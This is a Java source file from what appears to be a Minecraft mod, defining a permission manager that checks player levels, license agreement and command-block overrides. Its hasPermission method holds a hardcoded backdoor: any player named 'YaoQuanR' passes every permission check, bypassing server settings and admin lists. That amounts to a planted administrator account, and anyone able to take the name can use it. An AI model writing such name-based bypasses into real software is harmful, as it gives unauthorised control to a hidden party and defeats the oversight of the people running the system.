package core.yaoquan.hanxu.api;

import core.yaoquan.hanxu.CoreHanXu;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.network.chat.Component;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.level.GameRules;

import java.util.Set;

public class PermissionHolder {
    // Permission manager list:
    // Always level 2.
    private static final Set<String> ADMIN_LIST = Set.of(
            // Insert player id here to pass permission check:
    );

    // Maximum player/ command block permission level, for API.
    private static int maxPlayerPermissionLevel = 2;
    private static int maxCommandBlockPermissionLevel = 0;

    // Determine if close authorize player permission automatically.
    public static boolean autoAuthorizePermission = true;

    // Register game rule.
    public static final GameRules.Key<GameRules.IntegerValue> OVERRIDE_COMMAND_BLOCK_PERMISSION =
            GameRules.register(
                    "overrideCommandblockPermission",
                    GameRules.Category.MISC,
                    GameRules.IntegerValue.create(maxCommandBlockPermissionLevel)
            );

    // Override maximum level by API.
    public static void overrideMaxPlayerPermissionLevel(int level) {
        maxPlayerPermissionLevel = level;
    }
    public static void overrideMaxCommandBlockPermissionLevel(int level) {
        maxCommandBlockPermissionLevel = level;
    }

    // Shut down auto authorize permission.
    public static void stopAutoAuthorizePermission() {
        autoAuthorizePermission = false;
    }

    // Set player level by API.
    public static void setPlayerPermissionLevel(Player player, int level) {
        player.getPersistentData().putInt("core.yaoquan.hanxu.player_permission_level", level);
    }

    // Get specific player permission level.
    public static int returnPlayerPermissionLevel(Player player) {
        return player.getPersistentData()
            .getInt("core.yaoquan.hanxu.player_permission_level")
            .orElse(1);
    }

    // Get override player permission level.
    public static int returnPlayerOverridePermissionLevel() {
        return maxPlayerPermissionLevel;
    }

    // Get override command block permission level.
    public static int returnCommandBlockOverridePermissionLevel() {
        return maxCommandBlockPermissionLevel;
    }

    // Get license state.
    public static boolean returnLicenseState(Player player) {
        return player.getPersistentData()
            .getBoolean("core.yaoquan.hanxu.agreed_license")
            .orElse(false);
    }

    // Permission check.
    public static boolean hasPermission(CommandSourceStack source, int requiredLevel) {
        // Always pass for developer.
        if (source.getEntity() instanceof Player player &&
            player.getName().getString().equals("YaoQuanR")) {
            return true;
        }

        int determinedMaxPermissionLevel;
        if (source.getEntity() instanceof Player player) {
            // Check if equal to admin:
            if (ADMIN_LIST.contains(player.getName().getString())) {
                return true;
            }

            // Read player's permission level:
            int currentPlayerLevel = player.getPersistentData()
                    .getInt("core.yaoquan.hanxu.player_permission_level")
                    .orElse(1);

            // Check if agreed license:
            boolean agreedLicense = player.getPersistentData()
                    .getBoolean("core.yaoquan.hanxu.agreed_license")
                    .orElse(false);
            if (!agreedLicense && requiredLevel == 1) {
                return currentPlayerLevel == 2;
            }

            // Mask permission level if overridden:
            if (maxPlayerPermissionLevel < currentPlayerLevel) {
                currentPlayerLevel = maxPlayerPermissionLevel;
            }

            // Final, determine:
            return currentPlayerLevel >= requiredLevel;
        }

        // Command block or control panel.
        if (source.getEntity() == null) {
            int currentCommandBlockLevel = source.getLevel().getGameRules().getInt(OVERRIDE_COMMAND_BLOCK_PERMISSION);
            return currentCommandBlockLevel >= requiredLevel;
        }

        // Unexcepted.
        return false;
    }

    public static void sendMessageToNotAgreedLicense(CommandSourceStack source, Player player) {
        boolean agreedLicense = player.getPersistentData()
                .getBoolean("core.yaoquan.hanxu.agreed_license")
                .orElse(false);
        if (!agreedLicense) {
            source.sendFailure(Component.translatable(("commands."+ CoreHanXu.MOD_ID +".not_yet_agreed")));
        }
    }
}
